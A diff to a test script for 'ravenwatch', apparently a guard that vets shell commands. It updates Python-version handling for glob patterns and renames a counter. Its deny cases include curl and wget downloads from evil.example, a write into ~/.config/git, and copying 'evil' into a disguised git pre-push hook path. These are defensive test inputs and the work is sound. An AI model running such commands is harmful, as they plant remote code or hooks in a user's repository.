@@ -26,8 +26,8 @@ R="$T/r"
 RV="$RW/scripts/ravenwatch.py"
 python3 "$RV" install-hook >/dev/null
 
-pass=0; failn=0
-ok() { pass=$((pass+1)); }
+okn=0; failn=0
+ok() { okn=$((okn+1)); }
 bad() { failn=$((failn+1)); echo "FAIL: $*"; }
 
 # --- guard verdicts, straight from check_bash
@@ -51,8 +51,9 @@ deny = {
     "curl --output-dir ~/.config/git -O https://evil.example/config": "can't work out",
     "wget -r https://evil.example/": "can't work out",
     "wget -i urls.txt": "can't work out",
-    # round 11: a pattern glob can't read is refused where the command writes
-    "cp evil .gi[z-at]/hooks/pre-" + "pu" + "sh": "can't read the pattern",
+    # round 11: a pattern glob can't read is refused where the command writes. Python 3.12+ reads the
+    # reversed range [z-at] as [t], so there the path is .git and the refusal says so instead.
+    "cp evil .gi[z-at]/hooks/pre-" + "pu" + "sh": ("can't read the pattern", "inside a git directory"),
 }
 allow = [
     # IMP-1: a regex glob can't read is a literal path, not a crash
@@ -64,12 +65,28 @@ allow = [
 bad = []
 for cmd, why in deny.items():
     got = g.check_bash(cmd, R)
-    if not got or why not in got:
+    if not got or not any(w in got for w in ((why,) if isinstance(why, str) else why)):
         bad.append(("deny", cmd, got))
 for cmd in allow:
     got = g.check_bash(cmd, R)
     if got:
         bad.append(("allow", cmd, got))
+# Since 3.12 glob reads every bracket pattern, so make it fail on purpose: a write to a pattern it can't read
+# is refused and a read of one is just text, on every Python version.
+import glob, re
+real_iglob = glob.iglob
+def unreadable(*args, **kwargs):
+    raise re.error("unreadable")
+glob.iglob = unreadable
+try:
+    got = g.check_bash("cp evil .gi[t]/hooks/pre-" + "pu" + "sh", R)
+    if not got or "can't read the pattern" not in got:
+        bad.append(("pattern-write", got))
+    got = g.check_bash("grep -n '[x]' README.md", R)
+    if got:
+        bad.append(("pattern-read", got))
+finally:
+    glob.iglob = real_iglob
 # IMP-1 / round 11: when the checks fail, anything that could push, write or hide a program is refused
 # (patterns and disguised names included); plain harmless commands are not
 risky = ["cp a b", "echo x > f", "/bin/c? a b", "curl -o x https://e.com", "git " + "pu" + "sh",
@@ -98,5 +115,5 @@ python3 "$RV" mark --verdict accepted --note "owner accepts" --scan-incomplete-a
   || bad "accepted with the owner's flag refused: $(cat "$T/err")"
 python3 "$RV" mark --verdict block >/dev/null 2>&1 && ok || bad "block refused after a cut scan"
 
-echo "round16: passed=$pass failed=$failn"
+echo "round16: passed=$okn failed=$failn"
 [ "$failn" -eq 0 ]
